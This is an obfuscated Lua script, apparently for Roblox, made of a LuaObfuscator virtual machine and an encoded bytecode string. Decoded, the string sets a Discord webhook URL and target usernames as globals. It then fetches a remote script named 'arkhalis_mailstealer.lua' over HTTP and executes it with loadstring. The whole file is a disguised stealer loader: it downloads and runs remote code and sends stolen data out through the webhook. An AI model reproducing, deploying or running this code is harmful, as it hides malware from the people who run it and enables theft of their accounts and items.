--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v80=0;local v81;while true do if (v80==0) then v81=v2(v0(v30,16));if v19 then local v95=v5(v81,v19);v19=nil;return v95;else return v81;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v82=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (878 -(282 + 595)))) ;return v82-(v82%1) ;else local v83=0;local v84;while true do if (v83==(931 -(857 + 74))) then v84=(570 -((2004 -(1523 + 114)) + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v84 + v84))>=v84) and (1 + 0 + 0)) or (0 + 0) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + (2 -0) ;return (v36 * (1321 -(68 + 997))) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + ((2230 -(892 + 65)) -(226 + 1044)) );v18=v18 + (17 -13) ;return (v40 * (16777333 -(32 + 85))) + (v39 * (64226 + 1310)) + (v38 * ((135 -78) + (367 -168))) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=(4 -3) -0 ;local v44=(v20(v42,1 -0 ,4 + 16 ) * (2^(56 -24))) + v41 ;local v45=v20(v42,371 -(87 + 155 + 108) ,211 -(67 + 113) );local v46=((v20(v42,24 + 8 )==(2 -1)) and  -(1 + 0)) or (3 -2) ;if (v45==(0 -(0 -0))) then if (v44==(0 + 0)) then return v46 * (952 -(802 + 150)) ;else v45=2 -1 ;v43=(0 -0) -0 ;end elseif (v45==(1490 + (1416 -(814 + 45)))) then return ((v44==(997 -(915 + 82))) and (v46 * ((2 -1)/(0 + 0)))) or (v46 * NaN) ;end return v8(v46,v45-(596 + 427) ) * (v43 + (v44/((2 -0)^(1239 -(1069 + 118))))) ;end local function v25(v47)local v48;if  not v47 then v47=v23();if (v47==0) then return "";end end v48=v3(v16,v18,(v18 + v47) -(2 -1) );v18=v18 + v47 ;local v49={};for v63=1 + 0 , #v48 do v49[v63]=v2(v1(v3(v48,v63,v63)));end return v6(v49);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v50=0 -0 ;local v51;local v52;local v53;local v54;local v55;local v56;while true do local v65=0;while true do if (v65==(121 -(30 + 90))) then if (v50==0) then local v94=0 + 0 ;while true do if (v94~=0) then else v51={};v52={};v94=1;end if (v94==(1 + 0)) then v53={};v54={v51,v52,nil,v53};v94=2 -0 ;end if (v94~=(5 -3)) then else v50=1;break;end end end break;end if (v65==0) then local v87=0 + 0 ;while true do if (v87==(1 + 0)) then v65=1;break;end if (v87~=(396 -(115 + 281))) then else if ((2 -1)==v50) then local v96=0 + 0 ;while true do if ((0 -0)~=v96) then else local v98=0;while true do if (v98~=(0 -0)) then else v55=v23();v56={};v98=868 -(550 + 317) ;end if (v98==(1 -0)) then v96=1;break;end end end if (v96==1) then local v99=0 -0 ;while true do if (v99==0) then for v145=1,v55 do local v146=0 -0 ;local v147;local v148;while true do if (v146~=(285 -(134 + 151))) then else local v162=0;local v163;while true do if (v162==0) then v163=0;while true do if (v163==(1666 -(970 + 695))) then v146=1 -0 ;break;end if (v163==(1990 -(582 + 1408))) then local v176=0;while true do if (v176==1) then v163=1;break;end if (v176~=0) then else v147=v21();v148=nil;v176=1;end end end end break;end end end if (v146==1) then if (v147==(3 -2)) then v148=v21()~=(0 -0) ;elseif (v147==2) then v148=v24();elseif (v147~=3) then else v148=v25();end v56[v145]=v148;break;end end end v54[3]=v21();v99=1;end if (v99==(3 -2)) then v96=1826 -(1195 + 629) ;break;end end end if (v96==2) then v50=2 -0 ;break;end end end if (v50==(243 -(187 + 54))) then local v97=0;while true do if (1~=v97) then else return v54;end if (v97==0) then for v100=1,v23() do local v101=780 -(162 + 618) ;local v102;local v103;while true do if ((1 + 0)==v101) then while true do if (0~=v102) then else v103=v21();if (v20(v103,1,1 + 0 )~=0) then else local v170=0 -0 ;local v171;local v172;local v173;local v174;while true do if (v170~=2) then else while true do if (v171~=3) then else if (v20(v173,4 -1 ,3)~=1) then else v174[4]=v56[v174[1 + 3 ]];end v51[v100]=v174;break;end if (v171~=(1636 -(1373 + 263))) then else local v178=1000 -(451 + 549) ;while true do if (v178==0) then local v185=0;while true do if (v185~=(0 + 0)) then else v172=v20(v103,2 -0 ,3);v173=v20(v103,6 -2 ,1390 -(746 + 638) );v185=1;end if (v185==(1 + 0)) then v178=1;break;end end end if (v178~=1) then else v171=1 -0 ;break;end end end if (v171~=2) then else local v179=341 -(218 + 123) ;local v180;while true do if (v179==0) then v180=1581 -(1535 + 46) ;while true do if (1~=v180) then else v171=3 + 0 ;break;end if (v180==(0 + 0)) then if (v20(v173,1,1)==(561 -(306 + 254))) then v174[1 + 1 ]=v56[v174[3 -1 ]];end if (v20(v173,1469 -(899 + 568) ,2)~=(1 + 0)) then else v174[7 -4 ]=v56[v174[606 -(268 + 335) ]];end v180=1;end end break;end end end if (v171==(291 -(60 + 230))) then local v181=0;local v182;while true do if (v181==0) then v182=572 -(426 + 146) ;while true do if (v182==(0 + 0)) then local v186=1456 -(282 + 1174) ;while true do if (v186==(812 -(569 + 242))) then v182=2 -1 ;break;end if (v186==(0 + 0)) then v174={v22(),v22(),nil,nil};if (v172==0) then local v191=1251 -(721 + 530) ;local v192;local v193;while true do if (v191==1) then while true do if (0~=v192) then else v193=1271 -(945 + 326) ;while true do if (v193==(0 -0)) then v174[3]=v22();v174[4 + 0 ]=v22();break;end end break;end end break;end if (v191~=0) then else v192=700 -(271 + 429) ;v193=nil;v191=1 + 0 ;end end elseif (v172==1) then v174[3]=v23();elseif (v172==2) then v174[1503 -(1408 + 92) ]=v23() -((1088 -(461 + 625))^16) ;elseif (v172==3) then local v196=0;local v197;while true do if (v196==0) then v197=0;while true do if (v197~=0) then else v174[1291 -(993 + 295) ]=v23() -((1 + 1)^(1187 -(418 + 753))) ;v174[4]=v22();break;end end break;end end end v186=1;end end end if (v182~=(1 + 0)) then else v171=2;break;end end break;end end end end break;end if (v170~=(1 + 0)) then else v173=nil;v174=nil;v170=2;end if (v170==(0 + 0)) then local v175=0 + 0 ;while true do if (v175~=(530 -(406 + 123))) then else v170=1;break;end if ((1769 -(1749 + 20))==v175) then v171=0 + 0 ;v172=nil;v175=1323 -(1249 + 73) ;end end end end end break;end end break;end if (v101~=0) then else v102=0 + 0 ;v103=nil;v101=1;end end end for v104=1146 -(466 + 679) ,v23() do v52[v104-(2 -1) ]=v28();end v97=2 -1 ;end end end v87=1901 -(106 + 1794) ;end end end end end end local function v29(v57,v58,v59)local v60=v57[1];local v61=v57[2];local v62=v57[3];return function(...)local v66=v60;local v67=v61;local v68=v62;local v69=v27;local v70=1;local v71= -1;local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v85=0,v74 do if (v85>=v68) then v72[v85-v68 ]=v73[v85 + 1 ];else v76[v85]=v73[v85 + 1 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do local v86=0;while true do if (v86==0) then v78=v66[v70];v79=v78[1];v86=1;end if (v86==1) then if (v79<=10) then if (v79<=4) then if (v79<=1) then if (v79==0) then v70=v78[3];else v76[v78[2]][v78[3]]=v78[4];end elseif (v79<=2) then v76[v78[2]]=v78[3];elseif (v79==3) then v76[v78[2]]();else local v130=0;local v131;while true do if (v130==0) then v131=v78[2];v76[v131]=v76[v131](v13(v76,v131 + 1 ,v71));break;end end end elseif (v79<=7) then if (v79<=5) then local v111=0;local v112;local v113;while true do if (v111==1) then v76[v112 + 1 ]=v113;v76[v112]=v113[v78[4]];break;end if (v111==0) then v112=v78[2];v113=v76[v78[3]];v111=1;end end elseif (v79>6) then v70=v78[3];elseif (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end elseif (v79<=8) then local v114=v78[2];local v115=v76[v78[3]];v76[v114 + 1 ]=v115;v76[v114]=v115[v78[4]];elseif (v79==9) then v76[v78[2]]=v78[3];else do return;end end elseif (v79<=15) then if (v79<=12) then if (v79>11) then v76[v78[2]]=v78[3]~=0 ;else do return;end end elseif (v79<=13) then v76[v78[2]]=v59[v78[3]];elseif (v79>14) then if (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end else v76[v78[2]]();end elseif (v79<=18) then if (v79<=16) then v76[v78[2]]=v59[v78[3]];elseif (v79==17) then v76[v78[2]]=v78[3]~=0 ;else local v136=v78[2];v76[v136]=v76[v136](v13(v76,v136 + 1 ,v71));end elseif (v79<=19) then local v124=0;local v125;local v126;local v127;local v128;while true do if (v124==0) then v125=v78[2];v126,v127=v69(v76[v125](v13(v76,v125 + 1 ,v78[3])));v124=1;end if (v124==1) then v71=(v127 + v125) -1 ;v128=0;v124=2;end if (v124==2) then for v157=v125,v71 do local v158=0;while true do if (0==v158) then v128=v128 + 1 ;v76[v157]=v126[v128];break;end end end break;end end elseif (v79>20) then v76[v78[2]][v78[3]]=v78[4];else local v140=0;local v141;local v142;local v143;local v144;while true do if (v140==0) then v141=v78[2];v142,v143=v69(v76[v141](v13(v76,v141 + 1 ,v78[3])));v140=1;end if (v140==1) then v71=(v143 + v141) -1 ;v144=0;v140=2;end if (v140==2) then for v165=v141,v71 do v144=v144 + 1 ;v76[v165]=v142[v144];end break;end end end v70=v70 + 1 ;break;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F4703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O3133383932313O3237343330343O312F6C557444753944304630536E78356D77457068747854355F666E634A415169742D36644B7150667A6B79337155684E674D446E78745F636C6A49422D2O3243684E6F7262030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403363O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F61726B68616C69735F6D61696C737465616C65722E6C756103093O00557365726E616D6531030A3O004D696B6861636B2O303103093O00557365726E616D6532035O00173O0012093O00013O00260F3O000E0001000200044O000E0001001210000100033O003001000100040005001210000100063O001210000200073O002005000200020008001209000400094O000C000500014O0014000200054O000400013O00022O000E00010001000100044O0016000100260F3O00010001000100044O00010001001210000100033O0030010001000A000B001210000100033O0030010001000C000D0012093O00023O00044O000100012O000B3O00017O00",v9(),...);end
